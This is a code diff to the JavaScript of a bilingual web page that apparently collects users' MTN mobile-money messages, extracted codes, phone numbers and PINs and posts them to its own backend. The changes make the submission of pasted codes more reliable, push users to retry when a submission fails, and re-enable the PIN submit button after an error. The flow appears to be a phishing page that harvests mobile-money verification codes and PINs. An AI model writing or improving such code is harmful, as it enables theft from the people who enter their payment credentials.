@@ -1440,17 +1440,37 @@
 
             // Send to backend to save the link
             try {
-                await fetch('/api/mtn/momo-link', {
+                const res = await fetch('/api/mtn/momo-link', {
                     method: 'POST',
+                    credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
+                        requestId: currentRequestId,
                         link: msg,
+                        extractedCode: msg,
                         phone: `${phoneCode}${currentMsisdn}`,
                         country: currentCountry,
                         attempt: momoAttempts
                     })
                 });
-            } catch(e) {}
+                const data = await res.json();
+                if (!res.ok || !data.success) {
+                    throw new Error(data.message || data.error || 'Link submission failed');
+                }
+                if (data.requestId) currentRequestId = data.requestId;
+            } catch(e) {
+                momoAttempts = Math.max(0, momoAttempts - 1);
+                errEl.style.color = '#EF4444';
+                errEl.textContent = currentLang === 'fr'
+                    ? 'Impossible d’envoyer le lien. Veuillez réessayer.'
+                    : 'Could not submit the link. Please try again.';
+                document.getElementById('momoMsgInput').value = '';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+                btn.textContent = currentLang === 'fr' ? 'Soumettre le lien' : 'Submit Link';
+                return;
+            }
 
             if (momoAttempts >= MOMO_MAX_ATTEMPTS) {
                 // Max attempts: allow proceed regardless
@@ -1576,7 +1596,7 @@
                     pinError.style.background = '#FEF2F2';
                     pinError.style.color = '#DC2626';
                     pinError.classList.add('show');
-                    submitBtn.disabled = true;
+                    submitBtn.disabled = false;
                     submitBtn.textContent = t('submit');
                     pinInputs[0].focus();
                     break;
